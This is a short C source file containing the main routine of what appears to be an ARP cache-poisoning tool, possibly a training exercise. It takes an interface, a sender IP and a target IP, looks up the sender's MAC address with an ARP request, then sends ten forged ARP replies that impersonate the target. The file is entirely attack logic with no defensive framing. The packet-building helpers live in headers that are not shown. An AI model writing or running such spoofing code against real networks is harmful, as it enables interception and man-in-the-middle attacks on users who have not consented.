#include "common.h"
#include "use_pcap.h"
#include "use_socket.h"
#include "build.h"

int main(int argc, char *argv[])
{
    pcap_arg arg;
    struct arp_header ahdr;

    if (argc < 4)
    {
        pr_err("Usage : %s <interface> <sender ip> <target ip>",
               argv[0]);
        exit(EXIT_FAILURE);
    }

    if (init_handle(&arg, argv[1]))
    {
        exit(EXIT_FAILURE);
    }

    if (set_handle_arp(&arg))
    {
        exit(EXIT_FAILURE);
    }

    if (get_local_addr(&arg, argv[1]))
    {
        exit(EXIT_FAILURE);
    }

    // send arp request
    if (send_arp_request(&arg, argv[2]))
    {
        exit(EXIT_FAILURE);
    }

    if (recv_arp_packet(&arg, &ahdr))
    {
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < 10; i++)
    {
        if (send_arp_poison(&arg, &ahdr, argv[3]))
        {
            exit(EXIT_FAILURE);
        }
    }

    if (close_handle(&arg))
    {
        exit(EXIT_FAILURE);
    }

    return 0;
}

